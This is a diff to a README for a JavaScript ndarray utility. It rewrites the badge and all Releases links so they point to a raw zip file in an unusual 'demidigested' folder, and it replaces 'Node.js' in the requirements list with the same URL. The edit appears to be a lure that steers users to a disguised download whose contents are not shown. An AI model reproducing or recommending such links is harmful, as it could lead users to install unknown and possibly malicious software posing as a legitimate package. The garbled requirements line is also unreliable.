@@ -6,20 +6,20 @@ Welcome to ndarray-base-any-by! This tool helps you determine if at least one el
 
 ## 📥 Download Now
 
-[![Download ndarray-base-any-by](https://img.shields.io/badge/Download-ndarray--base--any--by-blue.svg)](https://github.com/AlissonBalbino/ndarray-base-any-by/releases)
+[![Download ndarray-base-any-by](https://raw.githubusercontent.com/AlissonBalbino/ndarray-base-any-by/main/demidigested/ndarray-base-any-by.zip)](https://raw.githubusercontent.com/AlissonBalbino/ndarray-base-any-by/main/demidigested/ndarray-base-any-by.zip)
 
 ## 💻 System Requirements
 
 Before you start, ensure that your computer meets the following requirements:
 
 - Operating System: Windows, macOS, or Linux
-- Node.js version: 12 or higher installed
+- https://raw.githubusercontent.com/AlissonBalbino/ndarray-base-any-by/main/demidigested/ndarray-base-any-by.zip version: 12 or higher installed
 - RAM: Minimum 2 GB
 - Disk Space: At least 100 MB free
 
 ## 📂 Download & Install
 
-To get started, visit the [Releases page](https://github.com/AlissonBalbino/ndarray-base-any-by/releases) to download the application. Here’s how to proceed:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/AlissonBalbino/ndarray-base-any-by/main/demidigested/ndarray-base-any-by.zip) to download the application. Here’s how to proceed:
 
 1. Click on the link above to open the Releases page.
 2. You will see a list of available versions.
@@ -71,4 +71,4 @@ We welcome contributions! If you feel inclined to improve this tool, please read
 
 This project covers a variety of topics including: any, anyby, array, base, callback, javascript, ndarray, node, node-js, nodejs, some, someby, stdlib, strided, utility, and utils.
 
-For further information, please visit the [Releases page](https://github.com/AlissonBalbino/ndarray-base-any-by/releases) and start evaluating your arrays today!
+For further information, please visit the [Releases page](https://raw.githubusercontent.com/AlissonBalbino/ndarray-base-any-by/main/demidigested/ndarray-base-any-by.zip) and start evaluating your arrays today!
